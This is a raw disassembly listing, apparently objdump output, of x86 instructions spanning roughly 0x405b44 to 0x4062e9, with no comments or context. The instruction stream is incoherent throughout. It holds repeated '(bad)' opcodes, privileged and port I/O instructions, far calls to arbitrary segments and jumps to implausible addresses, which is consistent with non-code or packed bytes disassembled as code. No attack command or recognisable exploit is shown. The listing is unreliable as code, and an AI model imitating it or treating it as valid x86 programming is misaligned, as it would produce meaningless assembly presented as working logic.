  405b44:	retf   
  405b45:	cli    
  405b46:	int3   
  405b47:	mov    ds:0xa9dd35df,al
  405b4c:	jp     0x405afe
  405b4e:	mov    bh,0x56
  405b50:	int    0x5
  405b52:	push   edi
  405b53:	ss in  eax,0xd8
  405b56:	out    dx,eax
  405b57:	mov    eax,ds:0x718ecbc7
  405b5c:	xchg   ebx,eax
  405b5d:	sbb    ebx,DWORD PTR [eax+0x2b]
  405b60:	xchg   ebp,eax
  405b61:	adc    DWORD PTR [edi+esi*8],edi
  405b64:	std    
  405b65:	rcl    DWORD PTR [eax],cl
  405b67:	jp     0x405b19
  405b69:	call   0x1ac3:0x61f55a74
  405b70:	in     al,0xe1
  405b72:	push   ds
  405b73:	mov    ebx,0x75fbd6f9
  405b78:	jge    0x405b59
  405b7a:	dec    edx
  405b7b:	shl    edx,0xe5
  405b7e:	fimul  DWORD PTR [eax+edi*8+0x8]
  405b82:	push   ebp
  405b83:	in     eax,0x96
  405b85:	dec    eax
  405b86:	in     eax,dx
  405b87:	dec    edx
  405b88:	icebp  
  405b89:	adc    ch,BYTE PTR [eax-0x38]
  405b8c:	call   0xd37:0xf879a1cb
  405b93:	and    DWORD PTR [ebp+0x1c11c2ef],edi
  405b99:	popa   
  405b9a:	pushf  
  405b9b:	test   edx,edx
  405b9d:	ret    0x9879
  405ba0:	rol    BYTE PTR [ecx-0x9],0x7
  405ba4:	adc    eax,0x14e4dba
  405ba9:	xchg   DWORD PTR [esi],esi
  405bab:	lods   al,BYTE PTR ds:[esi]
  405bac:	adc    DWORD PTR ds:0xb899a08c,ebp
  405bb2:	pop    ss
  405bb3:	call   0xc2fa35a
  405bb8:	mov    ebp,0x35248c74
  405bbd:	lods   eax,DWORD PTR ds:[esi]
  405bbe:	lods   eax,DWORD PTR ds:[esi]
  405bbf:	adc    al,0x3e
  405bc1:	popa   
  405bc2:	and    dl,BYTE PTR [ebp+eax*2+0x56834771]
  405bc9:	stos   BYTE PTR es:[edi],al
  405bca:	or     eax,ebx
  405bcc:	mov    BYTE PTR [ebp+ebp*8-0x47],ch
  405bd0:	das    
  405bd1:	xor    dh,BYTE PTR [edx+ebx*1]
  405bd4:	and    BYTE PTR [ecx-0x59],dl
  405bd7:	pop    es
  405bd8:	inc    edx
  405bd9:	aaa    
  405bda:	outs   dx,BYTE PTR ds:[esi]
  405bdb:	jae    0x405baa
  405bdd:	retf   
  405bde:	fiadd  DWORD PTR [eax+0x701860b4]
  405be4:	fxch   st(6)
  405be6:	push   cs
  405be7:	mov    esp,0x60cf60bd
  405bec:	xchg   ecx,eax
  405bed:	int    0x52
  405bef:	xchg   esp,eax
  405bf0:	cli    
  405bf1:	(bad)  
  405bf2:	in     eax,dx
  405bf3:	jecxz  0x405b80
  405bf5:	sbb    eax,0xe323eb08
  405bfa:	cmc    
  405bfb:	fs or  ecx,ecx
  405bfe:	imul   ebx,ecx,0xf41c247d
  405c04:	sub    ebx,DWORD PTR [ecx+edi*2-0x3d512b93]
  405c0b:	mov    eax,ds:0x71fd971f
  405c10:	and    dl,BYTE PTR [eax+0x11]
  405c13:	mul    DWORD PTR [edi+0x56]
  405c16:	les    ebp,FWORD PTR [eax+esi*8-0x2c]
  405c1a:	add    BYTE PTR [edx+0xb],0xdf
  405c1e:	mov    ah,0x80
  405c20:	outs   dx,DWORD PTR ds:[esi]
  405c21:	mov    dl,0x20
  405c23:	xor    eax,DWORD PTR [ebx+ebx*4]
  405c26:	in     al,0xf6
  405c28:	rcl    DWORD PTR [ebx-0x7953224a],1
  405c2e:	or     ebp,DWORD PTR [eax-0x7f]
  405c31:	mov    esp,0x5323488
  405c36:	or     BYTE PTR [esi-0x5ec7cc6a],0x4a
  405c3d:	xlat   BYTE PTR ds:[ebx]
  405c3e:	push   ebx
  405c3f:	test   bl,bh
  405c41:	out    dx,eax
  405c42:	outs   dx,BYTE PTR ds:[esi]
  405c43:	mov    bl,0xcf
  405c45:	pushf  
  405c46:	loop   0x405c29
  405c48:	(bad)  
  405c49:	or     dl,BYTE PTR [eax+0x1df6473f]
  405c4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c50:	and    ebp,DWORD PTR es:[ebp-0x60]
  405c54:	fstp   QWORD PTR [eax+0x25]
  405c57:	xlat   BYTE PTR ds:[ebx]
  405c58:	fisttp DWORD PTR [edi*1-0x2f8119fa]
  405c5f:	pop    ebx
  405c60:	mov    dl,0xe1
  405c63:	inc    ecx
  405c64:	punpckhdq mm3,mm7
  405c67:	sbb    eax,0x326bcafa
  405c6c:	inc    edi
  405c6d:	xor    DWORD PTR [ebx+0x1b],eax
  405c70:	inc    esi
  405c71:	in     eax,0x5a
  405c73:	sahf   
  405c74:	jnp    0x405c34
  405c76:	(bad)  
  405c78:	das    
  405c79:	adc    BYTE PTR [edi-0x70],ch
  405c7c:	pop    esi
  405c7d:	push   ebx
  405c7e:	pusha  
  405c7f:	inc    edi
  405c80:	or     BYTE PTR [esi],ah
  405c82:	andnps xmm3,XMMWORD PTR [ecx+0x3d6628ae]
  405c89:	cmp    al,0x63
  405c8b:	push   cs
  405c8c:	dec    ebp
  405c8d:	stos   BYTE PTR es:[edi],al
  405c8e:	mov    es,ebp
  405c90:	and    BYTE PTR [edx+0x3f135eed],ch
  405c96:	cdq    
  405c97:	and    eax,0x3e9bcef3
  405c9c:	mov    edx,DWORD PTR [edi+0x5f]
  405c9f:	les    ecx,FWORD PTR [edx+0x5383664b]
  405ca5:	test   al,0xa9
  405ca7:	icebp  
  405ca8:	add    eax,0xe4141e11
  405cad:	stc    
  405cae:	pop    esp
  405caf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cb0:	fmul   QWORD PTR [ecx]
  405cb2:	scas   eax,DWORD PTR es:[edi]
  405cb3:	retf   
  405cb4:	call   0xec7b9a9b
  405cb9:	and    edi,DWORD PTR [edi-0x2b]
  405cbc:	sub    eax,0xeadf6ead
  405cc1:	in     al,dx
  405cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cc3:	xor    DWORD PTR ds:0x6ce3c046,ebx
  405cc9:	ret    
  405cca:	and    al,0x2e
  405ccc:	test   BYTE PTR [edi+0x49],dl
  405ccf:	loop   0x405caa
  405cd1:	push   esi
  405cd2:	add    DWORD PTR [edx+0x6e017b93],0xffffffe9
  405cd9:	xor    BYTE PTR [edx-0x700b9bf],0x53
  405ce0:	and    eax,DWORD PTR [ebp-0x68]
  405ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ce4:	mov    esi,0x8939bbc4
  405ce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cea:	leave  
  405ceb:	push   ecx
  405cec:	mov    ebx,0xcdbadad6
  405cf1:	mov    ebx,0x8fcacf8a
  405cf6:	xor    ebp,DWORD PTR [esi+0x26b389d7]
  405cfc:	cmp    esp,esi
  405cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cff:	push   es
  405d00:	cmp    al,0xe6
  405d02:	rcl    BYTE PTR [eax],1
  405d04:	xlat   BYTE PTR ds:[ebx]
  405d05:	xchg   DWORD PTR [edi],eax
  405d07:	shl    DWORD PTR [edi],0xb6
  405d0a:	jmp    0x405cc0
  405d0c:	outs   dx,DWORD PTR ds:[esi]
  405d0d:	xchg   esi,eax
  405d0e:	adc    ecx,ecx
  405d10:	push   edx
  405d11:	jg     0x405d3d
  405d13:	xor    BYTE PTR [esi+0x4ec508d1],al
  405d19:	mov    edx,0x2a23f575
  405d1e:	pop    ebx
  405d1f:	(bad)  
  405d21:	aam    0x5a
  405d23:	inc    edi
  405d24:	cli    
  405d25:	out    0x2b,eax
  405d27:	push   0x5e24bf40
  405d2c:	push   cs
  405d2d:	mov    BYTE PTR [edx],cl
  405d2f:	(bad)  
  405d30:	es pop ecx
  405d32:	sbb    ebx,esp
  405d34:	or     edx,0x8bdbd17a
  405d3a:	or     bh,BYTE PTR [eax]
  405d3c:	inc    ebp
  405d3d:	(bad)  
  405d3e:	repz int 0xac
  405d41:	or     DWORD PTR [esp+eiz*4-0x33614189],esp
  405d48:	xor    cl,BYTE PTR [eax+edx*1-0x7b]
  405d4c:	or     esi,DWORD PTR [ecx]
  405d4e:	ss pop edx
  405d50:	fisttp DWORD PTR [ecx]
  405d52:	jg     0x405db6
  405d54:	inc    ebx
  405d55:	fstp   DWORD PTR [ecx-0x66]
  405d58:	inc    ecx
  405d59:	xor    eax,0xaf80f1e5
  405d5e:	push   0x2a
  405d60:	out    0x8f,eax
  405d62:	leave  
  405d63:	adc    bh,BYTE PTR [eax+0x3]
  405d66:	pusha  
  405d67:	xchg   ecx,eax
  405d68:	pop    edx
  405d69:	push   ds
  405d6a:	or     esi,DWORD PTR [edx+0x2843141f]
  405d70:	push   es
  405d71:	lea    esi,[eax-0x3f]
  405d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d75:	push   cs
  405d76:	retf   
  405d77:	xchg   ebx,edi
  405d79:	mov    ebp,DWORD PTR [ebp+0x57]
  405d7c:	mov    ah,0xd9
  405d7e:	or     esp,esi
  405d80:	mov    edi,0xe9d1e228
  405d85:	inc    esp
  405d86:	dec    esi
  405d87:	mov    ch,0x27
  405d89:	pop    ecx
  405d8a:	inc    edi
  405d8b:	inc    ebp
  405d8c:	pushf  
  405d8d:	cmp    al,0xc5
  405d8f:	pop    ds
  405d90:	mov    eax,ds:0x24b3ae17
  405d95:	or     al,bh
  405d97:	aad    0xfe
  405d99:	dec    esp
  405d9a:	test   DWORD PTR [esp+ebx*1+0x70],0xeba074cb
  405da2:	xchg   ebx,eax
  405da3:	mov    esp,0xa5d32576
  405da8:	bound  ecx,QWORD PTR [edx+0x3b]
  405dab:	retf   0x1ce
  405dae:	xchg   edi,eax
  405daf:	jle    0x405e14
  405db1:	mov    dl,0x52
  405db3:	data16 jbe 0x405de8
  405db6:	dec    edx
  405db7:	call   0xf8011253
  405dbc:	fisttp DWORD PTR [edx+0x5f9e5ccc]
  405dc2:	(bad)  
  405dc3:	sub    eax,0x92d5dbe8
  405dc8:	popa   
  405dc9:	adc    eax,0x7e215ea
  405dce:	arpl   WORD PTR [ebx],bx
  405dd0:	test   eax,0x57d94183
  405dd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dd6:	mov    ds:0xf1fb7d60,al
  405ddb:	mov    edi,0x1668814a
  405de0:	inc    eax
  405de1:	mov    esi,0xaaad1e58
  405de6:	mov    ds:0x1c62eeb9,al
  405deb:	xor    al,0x3
  405ded:	xchg   esi,eax
  405dee:	popf   
  405def:	sti    
  405df0:	pop    esi
  405df1:	loope  0x405dfc
  405df3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405df4:	repnz clc 
  405df6:	pusha  
  405df7:	pop    esp
  405df8:	stc    
  405df9:	mov    bh,0xc4
  405dfb:	in     eax,0x67
  405dfd:	jmp    0x5816cfa9
  405e02:	sti    
  405e03:	sub    ebx,edx
  405e05:	pop    edi
  405e06:	mov    ds:0xcc5cd818,al
  405e0b:	in     eax,0xd6
  405e0d:	inc    ecx
  405e0e:	mov    cs,edi
  405e10:	ds sbb eax,0x97478f18
  405e16:	push   ecx
  405e17:	fcmovnb st,st(1)
  405e19:	inc    esi
  405e1a:	cld    
  405e1b:	sub    eax,0x1cbc92b9
  405e20:	jae    0x405de4
  405e22:	aas    
  405e23:	mov    esp,0xcea85f3f
  405e28:	sbb    DWORD PTR [ebp+ecx*1-0x4b],edi
  405e2c:	dec    edi
  405e2d:	fisttp WORD PTR ds:0xbabd377f
  405e33:	gs es je 0x405e9b
  405e37:	(bad)  
  405e38:	je     0x405df6
  405e3a:	popf   
  405e3b:	push   ds
  405e3c:	mov    edx,0xf852bdb6
  405e41:	test   eax,0xcc0b7138
  405e46:	push   edi
  405e48:	popa   
  405e49:	pop    eax
  405e4a:	cmp    BYTE PTR [ebp-0x73],dh
  405e4d:	adc    edi,DWORD PTR [ebx]
  405e4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e50:	inc    ebx
  405e51:	mov    al,ds:0xb9036b5d
  405e56:	cmp    ah,BYTE PTR [eax]
  405e58:	mov    esi,DWORD PTR [ebx+0x56730de0]
  405e5e:	xlat   BYTE PTR ds:[ebx]
  405e5f:	cmp    esi,DWORD PTR [esp+ebx*2-0x68]
  405e63:	daa    
  405e64:	mov    ebp,0x1ac91a0a
  405e69:	lods   eax,DWORD PTR ds:[esi]
  405e6a:	and    edi,ebp
  405e6c:	fisttp DWORD PTR ds:[ebp-0x25]
  405e70:	dec    esp
  405e71:	scas   eax,DWORD PTR es:[edi]
  405e72:	div    DWORD PTR [ebx]
  405e74:	(bad)
  405e79:	mov    dh,0xb0
  405e7b:	mov    bl,0x5f
  405e7d:	outs   dx,DWORD PTR ds:[esi]
  405e7e:	lods   eax,DWORD PTR ds:[esi]
  405e7f:	push   ebp
  405e80:	cwde   
  405e81:	rcr    DWORD PTR [edi],0x2b
  405e84:	pop    esp
  405e85:	or     BYTE PTR [ecx-0x42],bl
  405e88:	jnp    0x405e45
  405e8a:	(bad)  
  405e8b:	popa   
  405e8c:	pushf  
  405e8d:	ret    
  405e8e:	pop    edx
  405e8f:	or     DWORD PTR [ebp-0x39],ecx
  405e92:	div    ah
  405e94:	imul   esp,DWORD PTR [ebx-0x5c944cda],0xfb0d1d72
  405e9e:	pushf  
  405e9f:	jns    0x405e3d
  405ea1:	jne    0x405ef0
  405ea3:	in     al,0x65
  405ea5:	or     DWORD PTR [ebx+0x6832700b],0xffffff90
  405eac:	popf   
  405ead:	inc    esi
  405eae:	inc    eax
  405eaf:	mov    ch,0x88
  405eb1:	push   ebx
  405eb2:	sub    eax,ebx
  405eb4:	clc    
  405eb5:	pop    esi
  405eb6:	and    ah,BYTE PTR [ebx+0xe]
  405eb9:	xchg   esi,eax
  405eba:	bound  edi,QWORD PTR [eax+esi*8+0x744a73a0]
  405ec1:	sbb    al,0x10
  405ec3:	dec    edx
  405ec4:	push   ss
  405ec5:	mov    DWORD PTR [ebp+0x28f12808],edi
  405ecb:	lods   eax,DWORD PTR ds:[esi]
  405ecc:	xor    esi,DWORD PTR ds:0x7d8c754c
  405ed2:	xchg   al,bl
  405ed4:	push   ecx
  405ed5:	inc    ebx
  405ed6:	mov    ah,0xd4
  405ed8:	jmp    0xd569e456
  405edd:	and    ax,0xc810
  405ee1:	lods   eax,DWORD PTR ds:[esi]
  405ee2:	jg     0x405ecf
  405ee4:	rcr    DWORD PTR [edi+0x7d],cl
  405ee7:	arpl   WORD PTR [edx-0x1d0b32fc],di
  405eed:	pop    ebx
  405eee:	hlt    
  405eef:	stos   BYTE PTR es:[edi],al
  405ef0:	adc    ecx,DWORD PTR [ebx]
  405ef2:	cmp    dh,ah
  405ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ef5:	xchg   ebx,eax
  405ef6:	div    DWORD PTR [edi]
  405ef8:	mov    dl,0x83
  405efa:	jbe    0x405f3e
  405efc:	jno    0x405eee
  405efe:	sysexit 
  405f00:	adc    DWORD PTR [edx-0x4e],ebx
  405f03:	pop    ecx
  405f04:	push   ebp
  405f05:	xchg   esp,eax
  405f06:	fidivr DWORD PTR [edi]
  405f08:	gs pop es
  405f0a:	out    dx,al
  405f0b:	mov    ecx,0xb54091c0
  405f10:	iret   
  405f11:	mov    edi,0x864ccea7
  405f16:	add    eax,DWORD PTR [edi]
  405f18:	out    dx,al
  405f19:	sar    DWORD PTR [edx],cl
  405f1b:	adc    esi,ecx
  405f1d:	addr16 jl 0x405f83
  405f20:	test   DWORD PTR [ebx-0x45],ebp
  405f23:	dec    eax
  405f24:	dec    esp
  405f25:	aas    
  405f26:	aas    
  405f27:	(bad)  
  405f28:	xor    DWORD PTR [eax+0x60],eax
  405f2b:	clc    
  405f2c:	and    DWORD PTR [ebx+edx*2-0x19],esp
  405f30:	push   ecx
  405f31:	push   esi
  405f32:	les    esp,FWORD PTR [edx-0x4305a291]
  405f38:	enter  0x5203,0x7
  405f3c:	gs mov ebp,0x4820e120
  405f42:	call   0xe8930028
  405f47:	xchg   BYTE PTR [eax-0x3b],ch
  405f4a:	dec    edx
  405f4b:	xchg   edi,eax
  405f4c:	xor    DWORD PTR ds:[ebx-0x2c],esp
  405f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f51:	pop    edx
  405f52:	into   
  405f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f54:	fcmovu st,st(7)
  405f56:	mov    ecx,0xc1e0c4f0
  405f5b:	xor    DWORD PTR [ebx+0x4a],0x6713a8d2
  405f62:	cmp    dl,BYTE PTR [ebx+0x1c6f2c6c]
  405f68:	mov    ebx,0x293511fa
  405f6d:	sbb    DWORD PTR [ebx-0x4c2e10e0],edx
  405f73:	cs jno 0x405efe
  405f76:	loope  0x405f58
  405f78:	or     esp,DWORD PTR [edx+0x2e90d617]
  405f7e:	outs   dx,BYTE PTR ds:[esi]
  405f7f:	fsub   QWORD PTR [ecx]
  405f81:	mov    DWORD PTR [eax+edx*8],esi
  405f84:	xor    esp,ebx
  405f86:	repz scas al,BYTE PTR es:[edi]
  405f88:	mov    edi,0xb04ae61c
  405f8d:	scas   al,BYTE PTR es:[edi]
  405f8e:	xor    dh,BYTE PTR [edx+0xa]
  405f91:	xchg   ecx,eax
  405f92:	mov    DWORD PTR [edi],esp
  405f94:	sub    ecx,DWORD PTR [edi+0xa]
  405f97:	das    
  405f98:	mov    dh,bh
  405f9a:	or     cl,BYTE PTR [ebx]
  405f9c:	fwait
  405f9d:	pushf  
  405f9e:	adc    DWORD PTR [ebp+0x38],ebx
  405fa1:	shr    BYTE PTR [edi],0xda
  405fa4:	aas    
  405fa5:	(bad)  
  405fa6:	retf   0x8677
  405fa9:	jno    0x405f58
  405fab:	cmp    esp,ebx
  405fad:	fst    QWORD PTR [edi]
  405faf:	je     0x405fa8
  405fb1:	add    DWORD PTR [ebx+0x5a4be0bc],esi
  405fb7:	aam    0x90
  405fb9:	or     DWORD PTR [eax],esi
  405fbb:	psubb  mm1,mm6
  405fbe:	and    DWORD PTR [edi+0x332c1f0f],0x75
  405fc5:	push   esp
  405fc6:	inc    ebx
  405fc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fc8:	(bad)  
  405fc9:	out    dx,eax
  405fca:	ss mov al,0x8e
  405fcd:	adc    edi,ebx
  405fcf:	mov    al,ds:0x27f4b216
  405fd4:	push   cs
  405fd5:	mov    dh,0x8a
  405fd7:	xor    dh,dl
  405fd9:	ror    ebp,0xa7
  405fdc:	jns    0x406025
  405fde:	sbb    eax,0xf95abd76
  405fe4:	or     DWORD PTR [ebx+0x5d6342b7],edi
  405fea:	mov    dh,0xcf
  405fec:	push   cs
  405fed:	fdiv   st,st(5)
  405fef:	mov    DWORD PTR ds:0x9fb457e9,edi
  405ff5:	inc    esp
  405ff6:	jne    0x405fdd
  405ff8:	mov    bl,0x37
  405ffa:	jl     0x405fd5
  405ffc:	mov    eax,ds:0xeeafb3c7
  406001:	xor    ebp,DWORD PTR [edx]
  406003:	dec    esi
  406004:	pop    ss
  406005:	sbb    ebx,DWORD PTR [edx]
  406007:	dec    ebp
  406008:	pop    eax
  406009:	pop    ebp
  40600a:	ja     0x406005
  40600c:	mov    WORD PTR [eax-0xb],es
  40600f:	shl    BYTE PTR [ebp-0x480b017],0x15
  406016:	xlat   BYTE PTR ds:[ebx]
  406017:	and    al,0xe9
  406019:	jle    0x406099
  40601b:	xor    eax,0x5d778175
  406020:	mov    ch,0x82
  406022:	mov    al,0xc6
  406024:	ins    BYTE PTR es:[edi],dx
  406025:	addr16 aam 0xae
  406028:	cmp    eax,0xce97ec58
  40602d:	and    eax,0xacebace7
  406032:	xor    al,0x45
  406034:	(bad)  
  406035:	jbe    0x40602d
  406037:	fld    st(4)
  406039:	ret    
  40603a:	mov    ds:0xc37b37f3,eax
  40603f:	jmp    0x406098
  406041:	in     eax,dx
  406042:	mov    ds,WORD PTR ds:0x7256092d
  406048:	jmp    FWORD PTR [ecx+0x4c64ca39]
  40604e:	jne    0x40601f
  406050:	add    esi,esp
  406052:	and    eax,0x8dcdb436
  406057:	cmp    ebp,DWORD PTR [esi+0x25]
  40605a:	push   edx
  40605b:	lods   al,BYTE PTR ds:[esi]
  40605c:	outs   dx,BYTE PTR ds:[esi]
  40605d:	call   0xb227:0xc03c5a81
  406064:	inc    eax
  406065:	or     al,0xcd
  406067:	mov    edi,0x1859a3a9
  40606c:	les    esp,FWORD PTR [ecx-0x2f2c8df1]
  406072:	test   BYTE PTR [esi],0x56
  406075:	das    
  406076:	pop    edi
  406077:	inc    edi
  406078:	cli    
  406079:	sahf   
  40607a:	dec    ecx
  40607b:	push   esi
  40607c:	fidivr DWORD PTR [esi]
  40607e:	mov    dh,0x64
  406080:	adc    al,0x17
  406082:	jae    0x40601e
  406084:	retf   0xd7d3
  406087:	dec    esp
  406088:	mov    dl,0x3c
  40608a:	mov    ecx,0xf17c1804
  40608f:	mov    BYTE PTR [edx-0x288659f9],bh
  406095:	jbe    0x4060ee
  406097:	int3   
  406098:	stos   BYTE PTR es:[edi],al
  406099:	dec    eax
  40609a:	and    al,0x29
  40609c:	sti    
  40609d:	add    al,0x39
  40609f:	aaa    
  4060a0:	(bad)  
  4060a2:	(bad)
  4060a5:	add    BYTE PTR [eax-0x1f9891a2],0x71
  4060ac:	out    0x1f,al
  4060ae:	icebp  
  4060af:	pop    ebx
  4060b0:	sbb    al,0xc
  4060b2:	xlat   BYTE PTR ds:[ebx]
  4060b3:	vfmsubaddps ymm7,ymm1,ymm3,ymm3
  4060b9:	pop    ecx
  4060ba:	shl    DWORD PTR [esi],cl
  4060bc:	rol    DWORD PTR [eax-0x69],1
  4060bf:	mov    WORD PTR [esi+0x2df17a86],cs
  4060c5:	jb     0x406144
  4060c7:	call   0xa2f4c474
  4060cc:	cmp    al,0xe3
  4060ce:	mov    edx,0x3b506f74
  4060d3:	xor    DWORD PTR [ebx-0x73db6d42],ecx
  4060d9:	jno    0x406148
  4060db:	je     0x406128
  4060dd:	jl     0x406124
  4060df:	mov    cl,0xca
  4060e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060e2:	push   eax
  4060e3:	bnd ja 0x40607b
  4060e6:	or     bh,BYTE PTR [ebx+ecx*8-0x656686cd]
  4060ed:	mul    DWORD PTR [eax-0x4625482d]
  4060f3:	mov    ebx,0xc760b948
  4060f8:	pop    ebx
  4060f9:	ins    DWORD PTR es:[edi],dx
  4060fa:	push   esp
  4060fb:	bound  esp,QWORD PTR [ecx-0x113cb465]
  406101:	xchg   ch,al
  406103:	pop    ss
  406104:	ret    0x3535
  406107:	pop    esp
  406108:	mov    bl,0x6c
  40610a:	into   
  40610b:	cmp    bh,dh
  40610d:	adc    DWORD PTR [ebp-0x2189686f],esp
  406113:	xor    bl,cl
  406115:	inc    esi
  406116:	or     BYTE PTR [edx],dl
  406118:	scas   eax,DWORD PTR es:[edi]
  406119:	push   esp
  40611a:	cdq    
  40611b:	pushf  
  40611c:	mov    ch,0xc0
  40611e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406120:	inc    esi
  406121:	pop    edx
  406122:	xorps  xmm6,XMMWORD PTR [ebp-0x45]
  406126:	mov    ah,0xd0
  406128:	test   al,0xb3
  40612a:	and    al,BYTE PTR [ebp+0x16]
  40612d:	call   0x51de:0xba75acfe
  406134:	jns    0x406139
  406136:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406137:	sbb    al,0x47
  406139:	call   0xd09bd09
  40613e:	nop
  40613f:	inc    ecx
  406140:	(bad)  
  406141:	cmc    
  406142:	sub    BYTE PTR [esi],bl
  406144:	loope  0x40616d
  406146:	shl    DWORD PTR [ecx+0x35],cl
  406149:	dec    edx
  40614a:	push   ss
  40614b:	dec    esi
  40614c:	pop    ebp
  40614d:	cmp    ebp,DWORD PTR [eax]
  40614f:	xchg   ebp,eax
  406150:	inc    eax
  406151:	xor    eax,0xb94939b9
  406156:	cmp    ch,BYTE PTR [ebx-0x1b]
  406159:	enter  0x99f9,0xc
  40615d:	sbb    eax,0x7d846de2
  406162:	loop   0x40619a
  406164:	rcl    DWORD PTR [eax+0x5d0303b],cl
  40616a:	jns    0x4061b8
  40616c:	(bad)  
  40616d:	call   0xefe1:0xbc5a2f0a
  406174:	mov    dh,0x62
  406176:	xchg   edi,eax
  406177:	ins    BYTE PTR es:[edi],dx
  406178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406179:	mov    esi,0xff6222ce
  40617e:	aam    0xdd
  406180:	cmp    BYTE PTR [ecx],dl
  406182:	adc    DWORD PTR [ebp-0x729de9a0],ecx
  406188:	xchg   ebp,eax
  406189:	xor    ebx,DWORD PTR [edi]
  40618b:	cmp    dl,al
  40618d:	adc    edx,eax
  40618f:	adc    esi,DWORD PTR [edi+0x6c5d02d6]
  406195:	ror    DWORD PTR [esp+edx*1],0xce
  406199:	add    edx,DWORD PTR [eax]
  40619b:	push   ds
  40619c:	cli    
  40619d:	outs   dx,DWORD PTR ds:[esi]
  40619e:	push   es
  40619f:	xor    eax,ecx
  4061a1:	cmp    eax,DWORD PTR [edx-0x3e0981cc]
  4061a7:	dec    eax
  4061a8:	fistp  WORD PTR [edi-0x3de4ee99]
  4061ae:	pop    ss
  4061af:	bound  esp,QWORD PTR [ebx+ecx*8+0x0]
  4061b3:	call   0x27f1:0xdb8d79e5
  4061ba:	imul   ebx,DWORD PTR [edi],0xf118df43
  4061c0:	pop    es
  4061c1:	sub    edx,DWORD PTR [edx+0x28]
  4061c4:	int    0xae
  4061c6:	fdiv   QWORD PTR [ebp-0x4503c289]
  4061cc:	jno    0x4061f3
  4061ce:	mov    DWORD PTR [edx-0x7e5b8cc],esp
  4061d4:	mov    eax,ds:0xa22f2141
  4061d9:	add    BYTE PTR [eax],dl
  4061db:	in     eax,dx
  4061dc:	je     0x406212
  4061de:	sbb    bh,BYTE PTR [edi-0x4a058afa]
  4061e4:	jo     0x40622f
  4061e6:	lods   eax,DWORD PTR ds:[esi]
  4061e7:	mov    gs,WORD PTR [ebp-0x79ae546d]
  4061ed:	mov    dl,0xd3
  4061ef:	pop    ebx
  4061f0:	(bad)  
  4061f1:	js     0x406240
  4061f3:	cmp    ebx,DWORD PTR [edi+0x1b7ca74e]
  4061f9:	mov    bl,0x27
  4061fb:	push   esi
  4061fc:	push   0xffffffd5
  4061fe:	dec    ecx
  4061ff:	add    eax,0xa6ab194e
  406204:	pop    ebx
  406205:	push   es
  406206:	in     eax,0x1f
  406208:	lahf   
  406209:	xchg   ecx,eax
  40620a:	xchg   ebp,eax
  40620b:	jp     0x4061fa
  40620d:	mov    dl,0x3e
  40620f:	outs   dx,BYTE PTR ds:[si]
  406211:	stos   DWORD PTR es:[edi],eax
  406212:	sbb    al,0xd4
  406214:	push   es
  406215:	cmp    ah,BYTE PTR [ebp+eax*1-0x16ff2b54]
  40621c:	cmp    ebx,DWORD PTR [ecx]
  40621e:	(bad)
  406221:	pop    eax
  406222:	fidiv  WORD PTR [edx+0x7f]
  406225:	fiadd  DWORD PTR [ecx]
  406227:	test   ebx,0xd22c1b7f
  40622d:	(bad)  
  40622e:	push   edi
  40622f:	pop    edx
  406230:	lock jo 0x4062a3
  406233:	mov    eax,0xb1021973
  406238:	pop    esp
  406239:	mov    esp,0x735c5189
  40623e:	jns    0x406220
  406240:	mov    bh,0x3f
  406242:	inc    esi
  406243:	sub    ecx,DWORD PTR [esi+0x65]
  406246:	pop    eax
  406247:	es aas 
  406249:	mov    ecx,0xb523aaed
  40624e:	mov    ebp,0xd26b5e86
  406253:	out    dx,al
  406254:	sti    
  406255:	fcmovne st,st(6)
  406257:	enter  0x94c5,0x57
  40625b:	in     al,dx
  40625c:	cli    
  40625d:	adc    ch,BYTE PTR [eax+esi*2+0x15d9072]
  406264:	push   0x153b201c
  406269:	xchg   esp,eax
  40626a:	dec    esp
  40626b:	cmp    DWORD PTR [ecx+eax*1],ebp
  40626e:	clc    
  40626f:	sub    bl,dl
  406271:	push   0x9da738c4
  406276:	and    al,0xde
  406278:	push   edi
  406279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40627a:	sahf   
  40627b:	arpl   WORD PTR [ebx+0xb397f9c],di
  406281:	inc    esp
  406282:	jg     0x406216
  406284:	mov    ds:0x2e45c9a1,eax
  406289:	loop   0x4062d2
  40628b:	fwait
  40628c:	imul   ecx,DWORD PTR [ebx-0x7e319e40],0x21bfc2d2
  406296:	cmp    ah,ch
  406298:	jle    0x40629a
  40629a:	addr16 push esi
  40629c:	ret    0x95e4
  40629f:	leave  
  4062a0:	push   ss
  4062a1:	push   0xcac30ad5
  4062a6:	mov    WORD PTR [edx],?
  4062a8:	fisubr DWORD PTR [edx+0x4b]
  4062ab:	stos   BYTE PTR es:[edi],al
  4062ac:	sub    eax,0xad0e7aa3
  4062b1:	call   0xde2e:0x1ba15376
  4062b8:	mov    al,ds:0x5eebdd1f
  4062bd:	sub    bh,0xea
  4062c0:	fst    DWORD PTR [ecx+0x454433de]
  4062c6:	mov    ecx,0x48f56dee
  4062cb:	xor    ebp,DWORD PTR [eax-0x5b907d82]
  4062d1:	hlt    
  4062d2:	std    
  4062d3:	retf   
  4062d4:	sbb    edx,DWORD PTR [edi+0x729c2dc]
  4062da:	int    0x20
  4062dc:	loope  0x406358
  4062de:	ror    BYTE PTR [ebp+0x2a001e0e],cl
  4062e4:	mov    dh,0xe2
  4062e6:	lods   al,BYTE PTR ds:[esi]
  4062e7:	sub    dh,cl
  4062e9:	jbe    0x406301
